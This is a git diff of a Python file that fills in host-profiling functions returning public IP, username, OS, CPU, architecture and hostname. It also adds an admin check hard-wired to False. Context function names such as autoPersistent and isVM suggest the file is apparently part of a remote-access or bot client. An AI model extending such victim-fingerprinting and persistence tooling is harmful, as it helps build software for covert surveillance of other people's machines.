@@ -1,6 +1,11 @@
 
 import subprocess as sp
+from urllib.request import urlopen
+import platform
+import json
+import ctypes
 import re
+import os
 
 
 def autoPersistent():
@@ -27,31 +32,64 @@ def isVM():
 
 
 def isAdmin():
-    pass
+    """try:
+        is_admin = (os.getuid() == 0)
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAdmin() != 0
+    except Exception:
+        is_admin = False"""
+    is_admin = False
+    return is_admin
 
 
 def getIP():
-    pass
+    url = 'https://api.myip.com'
+    try:
+        response = urlopen(url)
+        IP = json.loads(response.read())['ip']
+    except Exception:
+        IP = "None"
+    return IP
 
 
 def getBits():
-    pass
+    try:
+        BITS = platform.architecture()[0]
+    except Exception:
+        BITS = "None"
+    return BITS
 
 
 def getUsername():
-    pass
+    try:
+        USERNAME = os.getlogin()
+    except Exception:
+        USERNAME = "None"
+    return USERNAME
 
 
 def getOS():
-    pass
+    try:
+        OS = platform.platform()
+    except Exception:
+        OS = "None"
+    return OS
 
 
 def getCPU():
-    pass
+    try:
+        CPU = platform.processor()
+    except Exception:
+        CPU = "None"
+    return CPU
 
 
 def getHostname():
-    pass
+    try:
+        HOSTNAME = platform.node()
+    except Exception:
+        HOSTNAME = "None"
+    return HOSTNAME
 
 
 def createConfig():
